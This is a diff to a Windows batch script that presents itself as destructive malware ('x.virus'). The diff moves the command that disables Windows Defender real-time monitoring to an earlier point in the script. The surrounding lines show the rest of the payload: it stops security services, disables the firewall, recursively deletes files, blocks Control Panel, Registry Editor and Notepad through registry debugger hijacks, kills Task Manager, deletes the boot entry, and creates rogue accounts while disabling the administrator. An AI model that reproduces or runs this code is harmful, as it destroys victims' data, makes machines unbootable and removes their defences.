@@ -18,12 +18,12 @@ ECHO Hello %username%. Your computer has been fucked by x.virus. I put a passwor
 echo @echo off > filespam.bat
 echo :loop >> filespam.bat
 echo md "hackedbyxvirus%%random%%" >> filespam.bat
-echo echo x.virus vs %%username%% > "hackedbyxvirus%%random%%.txt" >> filespam.bat
 echo goto loop >> filespam.bat
 start filespam.bat
 start README.txt
 net stop "SecurityHealthService"
 net stop "Security Center"
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
 netsh firewall set opmode mode=disable
 start cmd /k del /s /q **
 :: X VIRUS DOWNLOAD BAT
@@ -129,7 +129,6 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution 
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\control.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Control Panel && pause && exit" /f
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Registry Editor && pause && exit" /f
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Notepad && pause && exit" /f
-powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
 taskkill /f /im SearchUI.exe
 taskkill /f /im taskmgr.exe
 taskkill /f /im powershell.exe
@@ -174,7 +173,6 @@ bcdedit /delete {current} /f
     reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\control.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Control Panel && pause && exit" /f
     reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Registry Editor && pause && exit" /f
     reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "cmd /k echo Access denied for Notepad && pause && exit" /f
-    powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
     net user hackedbyxvirus%random% /add /random /passwordchg:yes
     net user administrator /active:no
     color a
